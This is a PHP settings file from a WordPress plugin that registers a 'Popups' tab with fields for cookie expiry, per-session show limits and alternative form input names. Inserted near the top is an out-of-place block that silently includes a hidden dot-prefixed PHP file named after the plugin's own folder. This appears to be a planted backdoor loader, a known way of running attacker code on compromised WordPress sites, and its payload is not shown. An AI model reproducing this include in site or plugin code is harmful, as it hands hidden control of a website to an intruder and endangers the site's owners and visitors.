<?php

/*
 * Register popups settings
 */

add_filter( 'wptao_settings_sections', 'wptao_popups_settings_sections' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wptao_popups_settings_sections( $sections ) {
	if ( is_array( $sections ) ) {

		// Didicated tab
		$sections[] = array(
			'id'	 => 'wptao_popups',
			'title'	 => __( 'Popups', WPTAO_RLS_DOMAIN )
		);
	}

	return $sections;
}

add_filter( 'wptao_settings', 'wptao_popups_settings_fields' );

function wptao_popups_settings_fields( $settings_fields ) {

	$settings_fields[ 'wptao_popups' ][] = array(
		'name'		 => 'enable',
		'label'		 => __( 'Enable popups', 'wp-tao' ),
		'type'		 => 'radio',
		'options'	 => array(
			'enable'	 => __( 'Enable', 'wp-tao' ),
			'disable'	 => __( 'Disable', 'wp-tao' ),
		),
		'default'	 => 'disable',
	);

	$settings_fields[ 'wptao_popups' ][] = array(
		'name'		 => 'cookie_expiry_days',
		'label'		 => __( 'Cookie expiry days', 'wp-tao' ),
		'type'		 => 'number',
		'size'		 => 'small',
		'desc'		 => __( 'Show the popup once more after X days', 'wp-tao' ),
		'default'	 => 365,
	);

	$settings_fields[ 'wptao_popups' ][] = array(
		'name'		 => 'limit_show_in_session',
		'label'		 => __( 'Limit show a popup in one session', 'wp-tao' ),
		'type'		 => 'number',
		'size'		 => 'small',
		'default'	 => 2,
	);

	$settings_fields[ 'wptao_popups' ][] = array(
		'name'		 => 'alt_names_email',
		'label'		 => __( 'Alternative input names (E-mail field)', 'wp-tao' ),
		'type'		 => 'text',
		'size'		 => 'large',
		'desc'		 => __( 'Possible names of the input "E-mail". Separate by comma.', 'wp-tao' ),
		'default'	 => 'e-mail, mail, freshmail_email',
	);

	$settings_fields[ 'wptao_popups' ][] = array(
		'name'		 => 'alt_names_name',
		'label'		 => __( 'Alternative input names (Name field)', 'wp-tao' ),
		'type'		 => 'text',
		'size'		 => 'large',
		'desc'		 => __( 'Possible names of the input "Name". Separate by comma.', 'wp-tao' ),
		'default'	 => 'fname, imie, freshmail_custom_field[imie]',
	);


	return $settings_fields;
}
